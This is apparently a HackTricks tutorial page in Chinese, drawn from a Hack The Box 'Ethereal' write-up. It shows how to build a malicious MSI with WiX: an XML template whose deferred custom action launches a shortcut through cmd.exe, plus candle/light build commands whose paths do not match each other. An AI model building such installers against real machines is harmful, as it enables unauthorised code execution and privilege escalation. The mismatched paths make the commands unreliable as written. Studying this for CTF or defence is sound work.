{{#include ../../banners/hacktricks-training.md}}

# 创建恶意 MSI 并获取 Root

MSI 安装程序的创建将使用 wixtools，具体来说，将利用 [wixtools](http://wixtoolset.org)。值得一提的是，尝试了其他 MSI 构建工具，但在这个特定案例中并未成功。

为了全面理解 wix MSI 的使用示例，建议查阅 [此页面](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)。在这里，您可以找到各种示例，演示 wix MSI 的用法。

目标是生成一个将执行 lnk 文件的 MSI。为了实现这一点，可以使用以下 XML 代码（[xml 来自这里](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)）：
```markup
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
重要的是要注意，Package 元素包含诸如 InstallerVersion 和 Compressed 等属性，分别指定安装程序的版本并指示包是否被压缩。

创建过程涉及使用来自 wixtools 的 candle.exe 工具，从 msi.xml 生成 wixobject。应执行以下命令：
```
candle.exe -out C:\tem\wix C:\tmp\Ethereal\msi.xml
```
此外，值得一提的是，帖子中提供了一张图片，展示了命令及其输出。您可以参考它以获得视觉指导。

此外，light.exe，wixtools中的另一个工具，将用于从wixobject创建MSI文件。要执行的命令如下：
```
light.exe -out C:\tm\Ethereal\rick.msi C:\tmp\wix
```
与之前的命令类似，帖子中包含了一张图像，说明了该命令及其输出。

请注意，虽然本摘要旨在提供有价值的信息，但建议参考原始帖子以获取更全面的细节和准确的说明。

## 参考

- [https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with)
[wixtools](http://wixtoolset.org)

{{#include ../../banners/hacktricks-training.md}}
